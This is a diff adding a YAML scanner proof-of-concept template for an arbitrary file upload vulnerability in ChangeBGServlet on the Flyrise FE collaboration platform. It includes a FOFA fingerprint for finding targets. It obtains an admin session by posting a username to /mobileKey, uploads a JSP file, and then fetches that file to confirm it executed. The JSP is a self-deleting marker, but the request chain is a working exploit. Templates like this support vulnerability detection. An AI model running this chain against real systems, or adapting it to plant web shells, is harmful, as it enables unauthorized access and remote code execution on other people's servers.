@@ -1,0 +1,44 @@
+id: poc-yaml-flyrise-enterprise-changebgservlet-anyfile-upload
+info:
+  name: 飞企互联FE业务协作平台 ChangeBGServlet 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: FE业务协作平台
+  fofa: body="flyrise.stopBackspace.js"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /mobileKey
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: userName=admin
+  expression: status_code == 200 && contains(body,"true")
+  output:
+  - regex_match(headers,"SESSION=(?P<cookie>.*?);")
+- method: POST
+  path: /servlet/ChangeBGServlet
+  headers:
+    Cookie: SESSION={{.cookie}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
+  data: '------WebKitFormBoundaryKNt0t4vBe8cX9rZk
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+    Content-Type: text/plain
+
+
+    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--'
+  expression: status_code == 200 && contains(body,".jsp")
+  output:
+  - regex_match(body,"/login/applyTheme/images/portal/login/(?P<file>.*?).jsp")
+- method: GET
+  path: /login/applyTheme/images/portal/login/{{.file}}.jsp
+  headers:
+    Cookie: SESSION={{.cookie}}
+  expression: status_code == 200 && body == t2
+transport: http
